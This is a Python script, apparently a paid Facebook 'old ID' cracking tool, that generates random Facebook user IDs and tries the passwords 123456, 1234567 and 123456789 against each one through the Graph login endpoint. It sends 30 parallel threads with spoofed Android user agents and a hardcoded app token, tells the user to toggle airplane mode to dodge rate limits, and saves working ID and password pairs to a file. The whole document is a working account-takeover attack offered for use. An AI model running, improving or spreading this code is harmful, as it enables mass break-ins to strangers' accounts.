import os
import uuid,base64,hashlib,zlib,subprocess,time,platform
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 

orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
my_color = [white,blue,green];warna = random.choice(my_color)
loop,count = 0,0
oks,cps,twf = [],[],[]
import requests,random
usragent=[]
ugen=[]
okhbros=[]
uas=[]
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
for agenku in range(10000):
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2101K6G'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  okhbros.append(uakuh)
def ____banner____():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(f"""{green}FFFFFFF   AAA   HH   HH   AAA   DDDDD   
FF       AAAAA  HH   HH  AAAAA  DD  DD  
FFFF    AA   AA HHHHHHH AA   AA DD   DD 
FF      AAAAAAA HH   HH AAAAAAA DD   DD  
FF      AA   AA HH   HH AA   AA DDDDDD  {white}V{green}/{white}1.2
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{rad}[{white}◆{rad}] {green}DEVELOPER  {white}▶︎ {green}Fahad Islam
{rad}[{white}◆{rad}] {green}FACEBOOK   {white}▶︎ {green}Fahad Islam
{rad}[{white}◆{rad}] {green}TOOLTYPE   {white}▶︎ {green}PAID{white}{rad}┼{faltu}{rad}Old ids{pvt}{green}{rad}┼
{rad}[{white}◆{rad}] {green}GITHUB     {white}▶︎ {rad}({white}Fahad-404{rad})
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")     
def clear():
    os.system('clear')
    ____banner____()
#━━━━[ LINE ]━━━━#
def linex():
        print(f"{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#━━━━[ MAIN ]━━━━#
def _old_():
    ____banner____()
    print(f'{rad}[{white}A{rad}] {green}Old Id Clone');linex()
    _old_ = input(f'{rad}[{white}◆{rad}] {green}Selection  {white}▶︎ {yelloww}')
    if _old_ in ['A','a','01','1']:__Old__()
    else:print(f'\n[×]{rad} Choose Value Option... ');_old_()

#━━━━[ SELECT MENU ]━━━━#
def __Old__():
    user=[]
    clear()
    print(f'{rad}[{white}◆{rad}] Old code {yellow}:{green} 2010-2014')
    ask=input(f'{rad}[{white}◆{rad}] Select {yellow}:{green} ')
    linex()
    clear()
    print(f'{rad}[{white}◆{rad}] Example {yellow}:{green} 20000 / 30000 / 99999')
    limit=input(f'{rad}[{white}◆{rad}] Select {yellow}:{green} ')
    linex()
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)
    else:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,4999999999)))
            user.append(data)
    with tred(max_workers=30) as jihad:
        clear()
        print(f"{rad}[{white}◆{rad}] Total Id From Crack {yellow}: {green} {limit}{white}")
        print(f"{rad}[{white}◆{rad}] Use Airplane Mod For Good Result{green}")
        linex()
        for mal in user:
            uid=star+mal
            jihad.submit(login,uid)

def login(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r{yelloww} - {white}[{green}F  H D{white}]{yelloww} -{white} [{loop}{white}] {yelloww}- {white}[{green}OK {yelloww}- {green}{len(oks)}{white}]')
        sys.stdout.flush()
        ua1 = random.choice(ugen)
        #ua2 = windows()
       # ua3 = random.choice(okhbros)
        for pw in ["123456","1234567","123456789"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': ua1,
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:
                print(f'\r\r{white}[{green}FAHAD{yelloww}-{green}OK{white}] {green}{uid} | {pw}')
                open("/sdcard/FAHAD-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r{white}[{green}FAHAD{yelloww}-{green}OK{white}] {green}{uid} | {pw}')
                open("/sdcard/FAHAD-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
#━━━━[ END ]━━━━#


if __name__=="__main__":
    os.system('clear')
    __Old__()